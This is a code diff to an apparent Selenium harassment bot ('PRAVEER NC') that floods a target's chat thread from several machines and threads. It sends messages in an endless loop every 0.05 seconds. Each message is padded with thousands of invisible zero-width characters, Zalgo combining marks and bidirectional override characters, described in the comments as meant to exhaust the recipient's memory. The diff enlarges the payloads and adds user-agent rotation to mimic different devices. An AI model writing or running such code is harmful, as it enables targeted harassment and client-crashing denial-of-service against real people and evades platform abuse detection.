@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (10-AGENT OMNIPRESENCE)
-# 📅 STATUS: MULTI-AGENT BLITZ | RAM-LEAK | ZERO COOLDOWN
+# 🚀 PROJECT: PRAVEER NC (20-AGENT TOTAL BLACKOUT)
+# 📅 STATUS: 10-RUNNER MATRIX | DENSITY x50 | RAM-EATER
 
 import os, time, random, sys, gc, threading
 from concurrent.futures import ThreadPoolExecutor
@@ -13,10 +13,13 @@ from selenium.webdriver.chrome.options import Options
 THREADS_PER_MACHINE = 2
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_leak_payload(target_name):
-    u_id = random.randint(10000, 99999)
-    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 M{MACHINE_ID}_S{u_id}\n"
-    bloat = "".join(random.choice(["\u2060", "\u200D", "\uFEFF", "\u200B"]) for _ in range(5500))
+def get_blackout_payload(target_name):
+    u_id = random.randint(100000, 999999)
+    # Custom Header for the 'Abbu' branding
+    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 BLK_{MACHINE_ID}_{u_id}\n"
+    # 6000 Invisible characters for RAM pressure
+    bloat = "".join(random.choice(["\u2060", "\u200D", "\uFEFF", "\u200B"]) for _ in range(6000))
+    # Density x50 Zalgo
     z_tower = "̸" * 500
     bidi_logic = "\u202E\u2066\u202D\u2067" * 12
 
@@ -32,7 +35,9 @@ def get_driver():
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.{random.randint(1,99)} Safari/537.36")
+    # Rotate versions to mimic different devices
+    ver = random.randint(120, 122)
+    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36")
     return webdriver.Chrome(options=chrome_options)
 
 def agent_blitz(agent_id, cookie, target_id, target_name):
@@ -49,13 +54,13 @@ def agent_blitz(agent_id, cookie, target_id, target_name):
             time.sleep(12)
 
             while True:
-                if strike_count > 12: # More frequent purges for multi-agent stability
+                if strike_count > 10: # Aggressive local cleanup
                     driver.refresh()
-                    time.sleep(8)
+                    time.sleep(7)
                     strike_count = 0
 
                 box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
-                payload = get_leak_payload(target_name)
+                payload = get_blackout_payload(target_name)
                 
                 driver.execute_script("""
                     var box = arguments[0];
@@ -65,12 +70,12 @@ def agent_blitz(agent_id, cookie, target_id, target_name):
                 
                 box.send_keys(Keys.ENTER)
                 strike_count += 1
-                print(f"💀 [M{MACHINE_ID}-A{agent_id}] STRIKE {strike_count} LANDED", flush=True)
+                print(f"💀 [M{MACHINE_ID}-A{agent_id}] BLACKOUT STRIKE {strike_count}", flush=True)
                 
                 driver.execute_script("window.stop();")
-                time.sleep(0.05) # Extreme high-speed jitter
+                time.sleep(0.05) 
 
-        except Exception as e:
+        except Exception:
             if driver: driver.quit()
             time.sleep(5)
             continue
